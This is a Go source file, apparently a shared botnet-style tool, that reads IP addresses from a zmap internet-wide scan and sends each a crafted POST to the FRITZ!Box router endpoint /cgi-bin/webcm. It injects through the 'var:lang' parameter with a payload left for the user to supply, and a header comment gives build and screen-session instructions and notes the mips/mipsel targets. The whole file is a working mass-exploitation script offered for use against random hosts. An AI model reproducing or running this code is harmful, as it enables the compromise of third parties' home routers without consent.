/*
cd /tmp
wget https://dl.google.com/go/go1.9.4.linux-amd64.tar.gz -q
tar -xzf go1.9.4.linux-amd64.tar.gz
mv go /usr/local
export GOROOT=/usr/local/go
export GOPATH=$HOME/Projects/Proj1
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
go version
go env
cd ~/

go build fritzbox.go

zmap -p8080 -B1M -i eth0 | ./fritzbox

if you want to run in a screen (recommended)

yum install screen -y
screen zmap -p8080 -B1M -i eth0 | ./fritzbox

CTRL A+D to detach

the device architecture are mips and mipsel
to give u non-spoonfed thing figure out the payload, I already gave the architecture :D
 - Franco 

 */
package main

import (
    "net/http"
    "sync"
    "bufio"
    "time"
    "os"
    "strings"
    "bytes"
    "fmt"
)

var payload []byte = []byte("getpage=../html/menus/menu2.html&var:lang=your payload here")
 
var wg sync.WaitGroup  
var queue []string;
 
func work(ip string){
    ip = strings.TrimRight(ip, "\r\n")
    url := "http://"+ip+":80/cgi-bin/webcm?"
    tr := &http.Transport{
        ResponseHeaderTimeout: 5*time.Second,
        DisableCompression: true,
    }
    client := &http.Client{Transport: tr, Timeout: 5*time.Second}
    _, _ = client.Post(url, "text/plain", bytes.NewBuffer(payload))
    fmt.Printf("[fritzbox] attempting to exploit "+ip+"\n\x1b[37m")
}

func main(){
    for {
        r := bufio.NewReader(os.Stdin)
        scan := bufio.NewScanner(r)
        for scan.Scan(){
            go work(scan.Text())
            wg.Add(1)
            time.Sleep(2*time.Millisecond)
        }
    }
}